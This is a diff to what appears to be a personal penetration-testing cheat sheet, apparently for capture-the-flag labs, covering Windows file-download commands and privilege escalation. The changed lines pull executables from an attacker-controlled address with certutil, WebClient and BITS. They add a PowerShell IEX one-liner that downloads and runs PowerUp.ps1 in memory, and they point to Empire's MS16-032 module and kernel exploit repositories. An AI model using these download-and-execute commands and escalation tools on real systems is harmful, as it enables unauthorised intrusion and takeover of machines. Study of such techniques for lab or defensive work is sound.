@@ -47,10 +47,11 @@ iconv -t UTF-16LE | base64-w0
 powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
 
 DOWNLOAD FILE CMD/PS
-certutil -urlcache -split -f http://10.10.10.10/agent.exe C:\\users\\public\\agent.exe #CMD
-(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/1.exe', 'C:/users/merlin/Desktop/1.exe') # PS
-Start-BitsTransfer -Source http://10.10.14.12/jp.exe -Destination jp.exe # PS
-
+certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
+Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
+$client = New-Object System.Net.WebClient  # two steps is better
+$client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
 
 PRIVESC WINDOWS 
 whoami /priv
@@ -59,7 +60,8 @@ systeminfo
 metasploit local_exploit_suggester --> find vulns
 sherlock --> find vulns
 MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
-
+powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
+MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 
 LINUX
 
